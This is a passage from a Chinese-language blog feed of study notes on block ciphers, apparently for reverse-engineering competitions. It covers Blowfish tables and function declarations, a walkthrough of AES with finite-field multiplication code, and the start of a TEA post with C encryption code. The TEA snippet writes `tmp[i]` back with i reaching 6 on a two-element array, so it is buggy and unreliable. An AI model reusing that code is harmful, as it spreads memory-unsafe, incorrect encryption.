0x62FB1341L, 0xCEE4C6E8L,0xEF20CADAL, 0x36774C01L, 0xD07E9EFEL, 0x2BF11FB4L,0x95DBDA4DL, 0xAE909198L, 0xEAAD8E71L, 0x6B93D5A0L,0xD08ED1D0L, 0xAFC725E0L, 0x8E3C5B2FL, 0x8E7594B7L,0x8FF6E2FBL, 0xF2122B64L, 0x8888B812L, 0x900DF01CL,0x4FAD5EA0L, 0x688FC31CL, 0xD1CFF191L, 0xB3A8C1ADL,0x2F2F2218L, 0xBE0E1777L, 0xEA752DFEL, 0x8B021FA1L,0xE5A0CC0FL, 0xB56F74E8L, 0x18ACF3D6L, 0xCE89E299L,0xB4A84FE0L, 0xFD13E0B7L, 0x7CC43B81L, 0xD2ADA8D9L,0x165FA266L, 0x80957705L, 0x93CC7314L, 0x211A1477L,0xE6AD2065L, 0x77B5FA86L, 0xC75442F5L, 0xFB9D35CFL,0xEBCDAF0CL, 0x7B3E89A0L, 0xD6411BD3L, 0xAE1E7E49L,0x00250E2DL, 0x2071B35EL, 0x226800BBL, 0x57B8E0AFL,0x2464369BL, 0xF009B91EL, 0x5563911DL, 0x59DFA6AAL,0x78C14389L, 0xD95A537FL, 0x207D5BA2L, 0x02E5B9C5L,0x83260376L, 0x6295CFA9L, 0x11C81968L, 0x4E734A41L,0xB3472DCAL, 0x7B14A94AL, 0x1B510052L, 0x9A532915L,0xD60F573FL, 0xBC9BC6E4L, 0x2B60A476L, 0x81E67400L,0x08BA6FB5L, 0x571BE91FL, 0xF296EC6BL, 0x2A0DD915L,0xB6636521L, 0xE7B9F9B6L, 0xFF34052EL, 0xC5855664L,0x53B02D5DL, 0xA99F8FA1L, 0x08BA4799L, 0x6E85076AL },{ 0x4B7A70E9L, 0xB5B32944L, 0xDB75092EL, 0xC4192623L,0xAD6EA6B0L, 0x49A7DF7DL, 0x9CEE60B8L, 0x8FEDB266L,0xECAA8C71L, 0x699A17FFL, 0x5664526CL, 0xC2B19EE1L,0x193602A5L, 0x75094C29L, 0xA0591340L, 0xE4183A3EL,0x3F54989AL, 0x5B429D65L, 0x6B8FE4D6L, 0x99F73FD6L,0xA1D29C07L, 0xEFE830F5L, 0x4D2D38E6L, 0xF0255DC1L,0x4CDD2086L, 0x8470EB26L, 0x6382E9C6L, 0x021ECC5EL,0x09686B3FL, 0x3EBAEFC9L, 0x3C971814L, 0x6B6A70A1L,0x687F3584L, 0x52A0E286L, 0xB79C5305L, 0xAA500737L,0x3E07841CL, 0x7FDEAE5CL, 0x8E7D44ECL, 0x5716F2B8L,0xB03ADA37L, 0xF0500C0DL, 0xF01C1F04L, 0x0200B3FFL,0xAE0CF51AL, 0x3CB574B2L, 0x25837A58L, 0xDC0921BDL,0xD19113F9L, 0x7CA92FF6L, 0x94324773L, 0x22F54701L,0x3AE5E581L, 0x37C2DADCL, 0xC8B57634L, 0x9AF3DDA7L,0xA9446146L, 0x0FD0030EL, 0xECC8C73EL, 0xA4751E41L,0xE238CD99L, 0x3BEA0E2FL, 0x3280BBA1L, 0x183EB331L,0x4E548B38L, 0x4F6DB908L, 0x6F420D03L, 0xF60A04BFL,0x2CB81290L, 0x24977C79L, 0x5679B072L, 0xBCAF89AFL,0xDE9A771FL, 0xD9930810L, 0xB38BAE12L, 0xDCCF3F2EL,0x5512721FL, 0x2E6B7124L, 0x501ADDE6L, 0x9F84CD87L,0x7A584718L, 0x7408DA17L, 0xBC9F9ABCL, 0xE94B7D8CL,0xEC7AEC3AL, 0xDB851DFAL, 0x63094366L, 0xC464C3D2L,0xEF1C1847L, 0x3215D908L, 0xDD433B37L, 0x24C2BA16L,0x12A14D43L, 0x2A65C451L, 0x50940002L, 0x133AE4DDL,0x71DFF89EL, 0x10314E55L, 0x81AC77D6L, 0x5F11199BL,0x043556F1L, 0xD7A3C76BL, 0x3C11183BL, 0x5924A509L,0xF28FE6EDL, 0x97F1FBFAL, 0x9EBABF2CL, 0x1E153C6EL,0x86E34570L, 0xEAE96FB1L, 0x860E5E0AL, 0x5A3E2AB3L,0x771FE71CL, 0x4E3D06FAL, 0x2965DCB9L, 0x99E71D0FL,0x803E89D6L, 0x5266C825L, 0x2E4CC978L, 0x9C10B36AL,0xC6150EBAL, 0x94E2EA78L, 0xA5FC3C53L, 0x1E0A2DF4L,0xF2F74EA7L, 0x361D2B3DL, 0x1939260FL, 0x19C27960L,0x5223A708L, 0xF71312B6L, 0xEBADFE6EL, 0xEAC31F66L,0xE3BC4595L, 0xA67BC883L, 0xB17F37D1L, 0x018CFF28L,0xC332DDEFL, 0xBE6C5AA5L, 0x65582185L, 0x68AB9802L,0xEECEA50FL, 0xDB2F953BL, 0x2AEF7DADL, 0x5B6E2F84L,0x1521B628L, 0x29076170L, 0xECDD4775L, 0x619F1510L,0x13CCA830L, 0xEB61BD96L, 0x0334FE1EL, 0xAA0363CFL,0xB5735C90L, 0x4C70A239L, 0xD59E9E0BL, 0xCBAADE14L,0xEECC86BCL, 0x60622CA7L, 0x9CAB5CABL, 0xB2F3846EL,0x648B1EAFL, 0x19BDF0CAL, 0xA02369B9L, 0x655ABB50L,0x40685A32L, 0x3C2AB4B3L, 0x319EE9D5L, 0xC021B8F7L,0x9B540B19L, 0x875FA099L, 0x95F7997EL, 0x623D7DA8L,0xF837889AL, 0x97E32D77L, 0x11ED935FL, 0x16681281L,0x0E358829L, 0xC7E61FD6L, 0x96DEDFA1L, 0x7858BA99L,0x57F584A5L, 0x1B227263L, 0x9B83C3FFL, 0x1AC24696L,0xCDB30AEBL, 0x532E3054L, 0x8FD948E4L, 0x6DBC3128L,0x58EBF2EFL, 0x34C6FFEAL, 0xFE28ED61L, 0xEE7C3C73L,0x5D4A14D9L, 0xE864B7E3L, 0x42105D14L, 0x203E13E0L,0x45EEE2B6L, 0xA3AAABEAL, 0xDB6C4F15L, 0xFACB4FD0L,0xC742F442L, 0xEF6ABBB5L, 0x654F3B1DL, 0x41CD2105L,0xD81E799EL, 0x86854DC7L, 0xE44B476AL, 0x3D816250L,0xCF62A1F2L, 0x5B8D2646L, 0xFC8883A0L, 0xC1C7B6A3L,0x7F1524C3L, 0x69CB7492L, 0x47848A0BL, 0x5692B285L,0x095BBF00L, 0xAD19489DL, 0x1462B174L, 0x23820E00L,0x58428D2AL, 0x0C55F5EAL, 0x1DADF43EL, 0x233F7061L,0x3372F092L, 0x8D937E41L, 0xD65FECF1L, 0x6C223BDBL,0x7CDE3759L, 0xCBEE7460L, 0x4085F2A7L, 0xCE77326EL,0xA6078084L, 0x19F8509EL, 0xE8EFD855L, 0x61D99735L,0xA969A7AAL, 0xC50C06C2L, 0x5A04ABFCL, 0x800BCADCL,0x9E447A2EL, 0xC3453484L, 0xFDD56705L, 0x0E1E9EC9L,0xDB73DBD3L, 0x105588CDL, 0x675FDA79L, 0xE3674340L,0xC5C43465L, 0x713E38D8L, 0x3D28F89EL, 0xF16DFF20L,0x153E21E7L, 0x8FB03D4AL, 0xE6E39F2BL, 0xDB83ADF7L },{ 0xE93D5A68L, 0x948140F7L, 0xF64C261CL, 0x94692934L,0x411520F7L, 0x7602D4F7L, 0xBCF46B2EL, 0xD4A20068L,0xD4082471L, 0x3320F46AL, 0x43B7D4B7L, 0x500061AFL,0x1E39F62EL, 0x97244546L, 0x14214F74L, 0xBF8B8840L,0x4D95FC1DL, 0x96B591AFL, 0x70F4DDD3L, 0x66A02F45L,0xBFBC09ECL, 0x03BD9785L, 0x7FAC6DD0L, 0x31CB8504L,0x96EB27B3L, 0x55FD3941L, 0xDA2547E6L, 0xABCA0A9AL,0x28507825L, 0x530429F4L, 0x0A2C86DAL, 0xE9B66DFBL,0x68DC1462L, 0xD7486900L, 0x680EC0A4L, 0x27A18DEEL,0x4F3FFEA2L, 0xE887AD8CL, 0xB58CE006L, 0x7AF4D6B6L,0xAACE1E7CL, 0xD3375FECL, 0xCE78A399L, 0x406B2A42L,0x20FE9E35L, 0xD9F385B9L, 0xEE39D7ABL, 0x3B124E8BL,0x1DC9FAF7L, 0x4B6D1856L, 0x26A36631L, 0xEAE397B2L,0x3A6EFA74L, 0xDD5B4332L, 0x6841E7F7L, 0xCA7820FBL,0xFB0AF54EL, 0xD8FEB397L, 0x454056ACL, 0xBA489527L,0x55533A3AL, 0x20838D87L, 0xFE6BA9B7L, 0xD096954BL,0x55A867BCL, 0xA1159A58L, 0xCCA92963L, 0x99E1DB33L,0xA62A4A56L, 0x3F3125F9L, 0x5EF47E1CL, 0x9029317CL,0xFDF8E802L, 0x04272F70L, 0x80BB155CL, 0x05282CE3L,0x95C11548L, 0xE4C66D22L, 0x48C1133FL, 0xC70F86DCL,0x07F9C9EEL, 0x41041F0FL, 0x404779A4L, 0x5D886E17L,0x325F51EBL, 0xD59BC0D1L, 0xF2BCC18FL, 0x41113564L,0x257B7834L, 0x602A9C60L, 0xDFF8E8A3L, 0x1F636C1BL,0x0E12B4C2L, 0x02E1329EL, 0xAF664FD1L, 0xCAD18115L,0x6B2395E0L, 0x333E92E1L, 0x3B240B62L, 0xEEBEB922L,0x85B2A20EL, 0xE6BA0D99L, 0xDE720C8CL, 0x2DA2F728L,0xD0127845L, 0x95B794FDL, 0x647D0862L, 0xE7CCF5F0L,0x5449A36FL, 0x877D48FAL, 0xC39DFD27L, 0xF33E8D1EL,0x0A476341L, 0x992EFF74L, 0x3A6F6EABL, 0xF4F8FD37L,0xA812DC60L, 0xA1EBDDF8L, 0x991BE14CL, 0xDB6E6B0DL,0xC67B5510L, 0x6D672C37L, 0x2765D43BL, 0xDCD0E804L,0xF1290DC7L, 0xCC00FFA3L, 0xB5390F92L, 0x690FED0BL,0x667B9FFBL, 0xCEDB7D9CL, 0xA091CF0BL, 0xD9155EA3L,0xBB132F88L, 0x515BAD24L, 0x7B9479BFL, 0x763BD6EBL,0x37392EB3L, 0xCC115979L, 0x8026E297L, 0xF42E312DL,0x6842ADA7L, 0xC66A2B3BL, 0x12754CCCL, 0x782EF11CL,0x6A124237L, 0xB79251E7L, 0x06A1BBE6L, 0x4BFB6350L,0x1A6B1018L, 0x11CAEDFAL, 0x3D25BDD8L, 0xE2E1C3C9L,0x44421659L, 0x0A121386L, 0xD90CEC6EL, 0xD5ABEA2AL,0x64AF674EL, 0xDA86A85FL, 0xBEBFE988L, 0x64E4C3FEL,0x9DBC8057L, 0xF0F7C086L, 0x60787BF8L, 0x6003604DL,0xD1FD8346L, 0xF6381FB0L, 0x7745AE04L, 0xD736FCCCL,0x83426B33L, 0xF01EAB71L, 0xB0804187L, 0x3C005E5FL,0x77A057BEL, 0xBDE8AE24L, 0x55464299L, 0xBF582E61L,0x4E58F48FL, 0xF2DDFDA2L, 0xF474EF38L, 0x8789BDC2L,0x5366F9C3L, 0xC8B38E74L, 0xB475F255L, 0x46FCD9B9L,0x7AEB2661L, 0x8B1DDF84L, 0x846A0E79L, 0x915F95E2L,0x466E598EL, 0x20B45770L, 0x8CD55591L, 0xC902DE4CL,0xB90BACE1L, 0xBB8205D0L, 0x11A86248L, 0x7574A99EL,0xB77F19B6L, 0xE0A9DC09L, 0x662D09A1L, 0xC4324633L,0xE85A1F02L, 0x09F0BE8CL, 0x4A99A025L, 0x1D6EFE10L,0x1AB93D1DL, 0x0BA5A4DFL, 0xA186F20FL, 0x2868F169L,0xDCB7DA83L, 0x573906FEL, 0xA1E2CE9BL, 0x4FCD7F52L,0x50115E01L, 0xA70683FAL, 0xA002B5C4L, 0x0DE6D027L,0x9AF88C27L, 0x773F8641L, 0xC3604C06L, 0x61A806B5L,0xF0177A28L, 0xC0F586E0L, 0x006058AAL, 0x30DC7D62L,0x11E69ED7L, 0x2338EA63L, 0x53C2DD94L, 0xC2C21634L,0xBBCBEE56L, 0x90BCB6DEL, 0xEBFC7DA1L, 0xCE591D76L,0x6F05E409L, 0x4B7C0188L, 0x39720A3DL, 0x7C927C24L,0x86E3725FL, 0x724D9DB9L, 0x1AC15BB4L, 0xD39EB8FCL,0xED545578L, 0x08FCA5B5L, 0xD83D7CD3L, 0x4DAD0FC4L,0x1E50EF5EL, 0xB161E6F8L, 0xA28514D9L, 0x6C51133CL,0x6FD5C7E7L, 0x56E14EC4L, 0x362ABFCEL, 0xDDC6C837L,0xD79A3234L, 0x92638212L, 0x670EFA8EL, 0x406000E0L },{ 0x3A39CE37L, 0xD3FAF5CFL, 0xABC27737L, 0x5AC52D1BL,0x5CB0679EL, 0x4FA33742L, 0xD3822740L, 0x99BC9BBEL,0xD5118E9DL, 0xBF0F7315L, 0xD62D1C7EL, 0xC700C47BL,0xB78C1B6BL, 0x21A19045L, 0xB26EB1BEL, 0x6A366EB4L,0x5748AB2FL, 0xBC946E79L, 0xC6A376D2L, 0x6549C2C8L,0x530FF8EEL, 0x468DDE7DL, 0xD5730A1DL, 0x4CD04DC6L,0x2939BBDBL, 0xA9BA4650L, 0xAC9526E8L, 0xBE5EE304L,0xA1FAD5F0L, 0x6A2D519AL, 0x63EF8CE2L, 0x9A86EE22L,0xC089C2B8L, 0x43242EF6L, 0xA51E03AAL, 0x9CF2D0A4L,0x83C061BAL, 0x9BE96A4DL, 0x8FE51550L, 0xBA645BD6L,0x2826A2F9L, 0xA73A3AE1L, 0x4BA99586L, 0xEF5562E9L,0xC72FEFD3L, 0xF752F7DAL, 0x3F046F69L, 0x77FA0A59L,0x80E4A915L, 0x87B08601L, 0x9B09E6ADL, 0x3B3EE593L,0xE990FD5AL, 0x9E34D797L, 0x2CF0B7D9L, 0x022B8B51L,0x96D5AC3AL, 0x017DA67DL, 0xD1CF3ED6L, 0x7C7D2D28L,0x1F9F25CFL, 0xADF2B89BL, 0x5AD6B472L, 0x5A88F54CL,0xE029AC71L, 0xE019A5E6L, 0x47B0ACFDL, 0xED93FA9BL,0xE8D3C48DL, 0x283B57CCL, 0xF8D56629L, 0x79132E28L,0x785F0191L, 0xED756055L, 0xF7960E44L, 0xE3D35E8CL,0x15056DD4L, 0x88F46DBAL, 0x03A16125L, 0x0564F0BDL,0xC3EB9E15L, 0x3C9057A2L, 0x97271AECL, 0xA93A072AL,0x1B3F6D9BL, 0x1E6321F5L, 0xF59C66FBL, 0x26DCF319L,0x7533D928L, 0xB155FDF5L, 0x03563482L, 0x8ABA3CBBL,0x28517711L, 0xC20AD9F8L, 0xABCC5167L, 0xCCAD925FL,0x4DE81751L, 0x3830DC8EL, 0x379D5862L, 0x9320F991L,0xEA7A90C2L, 0xFB3E7BCEL, 0x5121CE64L, 0x774FBE32L,0xA8B6E37EL, 0xC3293D46L, 0x48DE5369L, 0x6413E680L,0xA2AE0810L, 0xDD6DB224L, 0x69852DFDL, 0x09072166L,0xB39A460AL, 0x6445C0DDL, 0x586CDECFL, 0x1C20C8AEL,0x5BBEF7DDL, 0x1B588D40L, 0xCCD2017FL, 0x6BB4E3BBL,0xDDA26A7EL, 0x3A59FF45L, 0x3E350A44L, 0xBCB4CDD5L,0x72EACEA8L, 0xFA6484BBL, 0x8D6612AEL, 0xBF3C6F47L,0xD29BE463L, 0x542F5D9EL, 0xAEC2771BL, 0xF64E6370L,0x740E0D8DL, 0xE75B1357L, 0xF8721671L, 0xAF537D5DL,0x4040CB08L, 0x4EB4E2CCL, 0x34D2466AL, 0x0115AF84L,0xE1B00428L, 0x95983A1DL, 0x06B89FB4L, 0xCE6EA048L,0x6F3F3B82L, 0x3520AB82L, 0x011A1D4BL, 0x277227F8L,0x611560B1L, 0xE7933FDCL, 0xBB3A792BL, 0x344525BDL,0xA08839E1L, 0x51CE794BL, 0x2F32C9B7L, 0xA01FBAC9L,0xE01CC87EL, 0xBCC7D1F6L, 0xCF0111C3L, 0xA1E8AAC7L,0x1A908749L, 0xD44FBD9AL, 0xD0DADECBL, 0xD50ADA38L,0x0339C32AL, 0xC6913667L, 0x8DF9317CL, 0xE0B12B4FL,0xF79E59B7L, 0x43F5BB3AL, 0xF2D519FFL, 0x27D9459CL,0xBF97222CL, 0x15E6FC2AL, 0x0F91FC71L, 0x9B941525L,0xFAE59361L, 0xCEB69CEBL, 0xC2A86459L, 0x12BAA8D1L,0xB6C1075EL, 0xE3056A0CL, 0x10D25065L, 0xCB03A442L,0xE0EC6E0EL, 0x1698DB3BL, 0x4C98A0BEL, 0x3278E964L,0x9F1F9532L, 0xE0D392DFL, 0xD3A0342BL, 0x8971F21EL,0x1B0A7441L, 0x4BA3348CL, 0xC5BE7120L, 0xC37632D8L,0xDF359F8DL, 0x9B992F2EL, 0xE60B6F47L, 0x0FE3F11DL,0xE54CDA54L, 0x1EDAD891L, 0xCE6279CFL, 0xCD3E7E6FL,0x1618B166L, 0xFD2C1D05L, 0x848FD2C5L, 0xF6FB2299L,0xF523F357L, 0xA6327623L, 0x93A83531L, 0x56CCCD02L,0xACF08162L, 0x5A75EBB5L, 0x6E163697L, 0x88D273CCL,0xDE966292L, 0x81B949D0L, 0x4C50901BL, 0x71C65614L,0xE6C6C7BDL, 0x327A140AL, 0x45E1D006L, 0xC3F27B9AL,0xC9AA53FDL, 0x62A80F00L, 0xBB25BFE2L, 0x35BDD2F6L,0x71126905L, 0xB2040222L, 0xB6CBCF7CL, 0xCD769C2BL,0x53113EC0L, 0x1640E3D3L, 0x38ABBD60L, 0x2547ADF0L,0xBA38209CL, 0xF746CE76L, 0x77AFA1C5L, 0x20756060L,0x85CBFE4EL, 0x8AE88DD8L, 0x7AAAF9B0L, 0x4CF9AA7EL,0x1948C25CL, 0x02FB8A8CL, 0x01C36AE4L, 0xD6EBE1F9L,0x90D4F869L, 0xA65CDEA0L, 0x3F09252DL, 0xC208E69FL,0xB74E6132L, 0xCE77E25BL, 0x578FDFE3L, 0x3AC372E6L }};#define N 16//定义初始化需要用到的加密结构typedef struct _BLOWFISH_CTX{//定义初始化的pbox 以及 sbox 在程序中进行初始化unsigned int pbox[N + 2]; //总共18unsigned int sbox[4][256];}BLOWFISH_CTX, * PBLOWFISH_CTX;/*初始化函数 此函数功能如下1.接受key 与 keylen参数（当然keylen）可以自己计算2.初始化sbox 将全局的sbox的内容复制到CTX中的sbox中3.初始化pbox pbox的初始化方法如下1.迭代18论。然后每一轮都设置CTX的pbox2.CTX.pbox需要使用全局pbox ^ data3.data是一个四字节整数。其中存储的就是key的四个字节。key = "12345678abc"每一轮中 data = "1234"data = "5678"data = "abc1" //注意这里当超出keylen的时候。 data获取的key要从0开始。。。。*/int BlowFishInit(BLOWFISH_CTX* blowCtx, unsigned char* key, unsigned int keylen);/*F函数F函数是将一个32位数分别进行拆分。 拆分为四组。 每一组都作为sbox的索引值然后进行下列运算(（s1[a] + s2[b]) ^ s3[c]) + s4[d]在编程中sbox是数组是从零开始。 所以s1 对应s[0] s2对应s[1]在编程中总结下公式：temap = s[0][a] + s[1][b]teamp = temp ^ s[2][c]'temp = temp + s[3][d]简单的记住就是 ((a+b) ^ c)+d;当然每个都对应下标为 0 1 2 3 s[0][a] s[1][b] s[2][c] s[3][d]最后返回结果值 return temp*/static unsigned long F(BLOWFISH_CTX* ctx, unsigned long x);//signed int F(PBLOWFISH_CTX blowCtx,unsigned int Data);/*加密函数：首次用在初始化中是对一个64位0进行加密。一次加密八个字节核心思想为 加密左边与右边数据左边数据直接 ^ PBOX右边数据 = 右边数据 ^ f(左边数据）然后进行交换。以上是16轮的交换剩下一轮则是左边 = 左边^PBOX[N+1]右边 = 右边^pbox[N]最后设置相关数值*/void BlowFish_Encry(PBLOWFISH_CTX blowCtx, unsigned int* left, unsigned int*right);/*跟加密一样。只不过结果相反步骤如下：首先遍历从最后一轮开始逐次递减最后一轮数据 右边= 右边^PBOX[1] 左边数据 = 左边数据 ^pbox[0]*/void BlowFish_Decrypt(PBLOWFISH_CTX blowCtx, unsigned int* left, unsigned int*right);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES</title>
      <link href="/2022/02/08/AES/"/>
      <url>/2022/02/08/AES/</url>
      
        <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><p>AES属于分组加密算法，即加解密都是使用同一密钥，但是是分为几组进行加密</p><p>明文长度固定为128位的倍数</p><p>密钥长度可以是128、192、256位</p><h1 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h1><p><img src="/2022/02/08/AES/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png"></p><h2 id="初始变换"><a href="#初始变换" class="headerlink" title="初始变换"></a>初始变换</h2><p>这里以16字节为例子</p><p>明文放入矩阵中</p><p><img src="/2022/02/08/AES/1644303811694.png"></p><p>子密钥放入矩阵，这里有省略号是因为后面会根据子密钥进行密钥扩展，初始变换取得是密钥扩展后的第0轮密钥</p><p><img src="/2022/02/08/AES/1644303864629.png"></p><p>明文矩阵和子密钥矩阵进行异或-轮密钥加</p><p>对应位置进行逐字节异或</p><p><img src="/2022/02/08/AES/1644304005507.png"></p><h2 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h2><p>AES算法会生成一个Sbox盒用于字节代换</p><p>代换方法：假如某个字节是D4，那么找到D4的位置，xy坐标结合就是代换后的结果，这里为19</p><p><img src="/2022/02/08/AES/1644304381876.png"></p><h2 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h2><p><img src="/2022/02/08/AES/1644304702612.png"></p><h2 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h2><p>将输入的4×4矩阵<strong>左乘</strong>一个给定的4×4矩阵</p><p>这里的+和×和矩阵里面的运算不同，待会介绍</p><p>给定的正矩阵</p><p><img src="/2022/02/08/AES/1644304934448.png"></p><p>过程</p><p><img src="/2022/02/08/AES/1644305201031.png"></p><h3 id="列混合计算"><a href="#列混合计算" class="headerlink" title="列混合计算"></a>列混合计算</h3><p>基于有限域的二维运算</p><h4 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h4><p><img src="/2022/02/08/AES/1644308359054.png"></p><p>要得到第一个数的结果，要先将第一个矩阵的第一行与第二个矩阵的第一列进行乘法，最后相加</p><p>而在列混合中，加法被替换成了异或</p><p>乘法也被修改了，注意是左移一位</p><p><img src="/2022/02/08/AES/1644308799475.png"></p><p>这里以第一个数为例</p><p>02×d4+03×bf+01×5d+01×30，这里的+是异或</p><p>02×d4过程</p><p>00000010×11010100，因为d4首位是1，所以结果为10101000^00011011,得到10110011</p><p>同理的到第一个数为04</p><h4 id="基于有限域的运算"><a href="#基于有限域的运算" class="headerlink" title="基于有限域的运算"></a>基于有限域的运算</h4><p><a href="https://blog.csdn.net/bupt073114/article/details/27382533">https://blog.csdn.net/bupt073114/article/details/27382533</a></p><p><a href="https://en.wikipedia.org/wiki/Finite_field_arithmetic#Multiplication">https://en.wikipedia.org/wiki/Finite_field_arithmetic#Multiplication</a></p><p><a href="https://www.cnblogs.com/xiehongfeng100/p/4315395.html">https://www.cnblogs.com/xiehongfeng100/p/4315395.html</a></p><h5 id="有限域"><a href="#有限域" class="headerlink" title="有限域"></a>有限域</h5><p>有限域亦称伽罗瓦域（galois field），是仅含有限个元素的域,它是伽罗瓦(Galois,E.)于18世纪30年代研究代数方程根式求解问题时引出的，有限域的特征数必为某一素数p</p><h5 id="有限域的乘法"><a href="#有限域的乘法" class="headerlink" title="有限域的乘法"></a>有限域的乘法</h5><p>AES的有限域是GF(2^8)，也就是说从0到256都属于这个有限域内</p><p> <img src="/2022/02/08/AES/051112046641282.png" alt="有限域的乘法"> </p><p>将字符转为二进制，最高位为x的7次方，最低位为x的0次方，也就是1</p><p>在AES的有限域二进制中，所有数都能通过01，02，04，08，10，20，40，80异或得到，下面是对应的二进制表示</p><p> <img src="/2022/02/08/AES/20140528221753187.jpg"> </p><p>后一个分别是前一个的2倍</p><p>假设一个数a为3，那么他的二进制为00000011，也就是0x2^0x1，这里的异或在有限域中是加法</p><p>而任意一个数x和a相乘可以表示为</p><p>x×a=x×(0x2+0x1)</p><p>所以我们只需计算出</p><p> <img src="/2022/02/08/AES/20140528222133843.jpg"> </p><p>然后异或所有结果即可</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>比如计算0x3a*0x24，0x3a的二进制为 00111010，</p><p>分别求，这里要注意乘二相当于左移一位，而有限域为2^8，所以可能会溢出，所以要判断最高位是否为1，如果为1的话，左移之后会溢出，就需要除以同余式，而在AES的有限域中，八次不可约同余式，这里被定义为 x^8+x^4+x^3+x+1，也就是异或上0x1B</p><p> <img src="/2022/02/08/AES/20140528222614812.jpg"> </p><p> 0x24=00100100，所以0x3a<em>0x24=0x3a</em>00100100=0x04<em>0x3a^0x20</em>0x3a=0xe8^0x01=0xe9</p><p>代码实现</p><pre class="language-c" data-language="c"><code class="language-c">unsigned char XTIME(unsigned char x) {    return ((x &lt;&lt; 1) ^ ((x &amp; 0x80) ? 0x1b : 0x00));}unsigned char multiply(unsigned char a, unsigned char b) {    unsigned char temp[8] = { a };    unsigned char tempmultiply = 0x00;    int i = 0;    for (i = 1; i &lt; 8; i++)     {        temp[i] = XTIME(temp[i - 1]);    }    tempmultiply = (b &amp; 0x01) * a;    for (i = 1; i &lt;= 7; i++)     {        tempmultiply ^= (((b &gt;&gt; i) &amp; 0x01) * temp[i]);    }    return tempmultiply;}</code></pre><p>第一个循环实现的是计算出异或01……的值</p><p>第二个循环，逐位循环，判断是否保留该值，也就是是否要+上该值，这里的加是^</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>每一列进行进行异或操作</p><p><img src="/2022/02/08/AES/1644306385450.png"></p><h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><p>通过子密钥生成十轮需要的密钥</p><h3 id="i不是4的倍数"><a href="#i不是4的倍数" class="headerlink" title="i不是4的倍数"></a>i不是4的倍数</h3><p>第i列计算公式：</p><p>W[i]=W[i-4]^W[i-1]</p><p><img src="/2022/02/08/AES/1644307284515.png"></p><h3 id="i是4的倍数"><a href="#i是4的倍数" class="headerlink" title="i是4的倍数"></a>i是4的倍数</h3><p>W[i]=W[i-4]^T(W[i-1])</p><p>T函数包括三部分：字循环、字节代换、轮常量异或</p><h4 id="字循环"><a href="#字循环" class="headerlink" title="字循环"></a>字循环</h4><p>将一列中的四个字节循环左移一个字节，即输入[b0,b1,b2,b3]变换成[b1,b2,b3,b0],然后放在一列中</p><p><img src="/2022/02/08/AES/1644307546072.png"></p><h4 id="字节代换-1"><a href="#字节代换-1" class="headerlink" title="字节代换"></a>字节代换</h4><p>对字循环的结果使用S盒进行字节代换</p><p><img src="/2022/02/08/AES/1644307740839.png"></p><h4 id="轮常量异或"><a href="#轮常量异或" class="headerlink" title="轮常量异或"></a>轮常量异或</h4><p>将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。</p><p>轮常量是给定的，因为要生成十个轮密钥，所以有十个轮常量</p><p><img src="/2022/02/08/AES/1644307898552.png"></p><p>过程</p><p><img src="/2022/02/08/AES/1644308032666.png"></p><p>最后，将得到的结果和W[i-4]异或即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tea、XTea、XXTea原理和实现</title>
      <link href="/2022/02/07/Tea%E3%80%81XTea%E3%80%81XXTea%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/02/07/Tea%E3%80%81XTea%E3%80%81XXTea%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h1><p>1、特征量（一般是0x9e3779b9，它是黄金分割数和232的乘积），可以替换成其他的值，但是可能会出现问题</p><p>2、主要加密部分进行异或和移位操作（一般都存在&lt;&lt;4、&gt;&gt;5）</p><p>3、key为128bit</p><h1 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h1><h2 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h2><p>数组的奇数下标元素从右侧传入后进行了移位异或和相加操作，最后偶数下标加上上面操作完的值，所以可以把等式右边看成一个常数，这样写逆向脚本好理解</p><p>结束第一步之后，奇数下标元素的偶数下标元素进行置换，再对奇数下标进行相同的加密</p><p>第三步就是sum+=Delta</p><p> <img src="/2022/02/07/Tea%E3%80%81XTea%E3%80%81XXTea%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/OIP-C.jfif"> </p><h2 id="加密代码"><a href="#加密代码" class="headerlink" title="加密代码"></a>加密代码</h2><pre class="language-c" data-language="c"><code class="language-c">int main(){unsigned int Data[8] = { 0 };unsigned int key[4] = { 0 };unsigned int tmp[2] = { 0 };unsigned int sum = 0;unsigned int delta = 0x9e3779b9;for (int i = 0; i &lt; 8; i += 2){tmp[0] = Data[i];tmp[1] = Data[i + 1];        sum=0;for (int i = 0; i &lt; 32; ++i){sum += delta;tmp[0] += ((tmp[1] &lt;&lt; 4) + key[0]) ^ (tmp[1] + sum) ^ ((tmp[1] &gt;&gt; 5) + key[1]);tmp[1] += ((tmp[0] &lt;&lt; 4) + key[2]) ^ (tmp[0] + sum) ^ ((tmp[0] &gt;&gt; 5) + key[3]);}Data[i] = tmp[i];Data[i + 1] = tmp[i + 1];}return 0;}</code></pre><h3 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h3><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;#include &lt;stdio.h&gt;int main(){unsigned int Data[8] = { 0 };unsigned int key[4] = { 0 };unsigned int 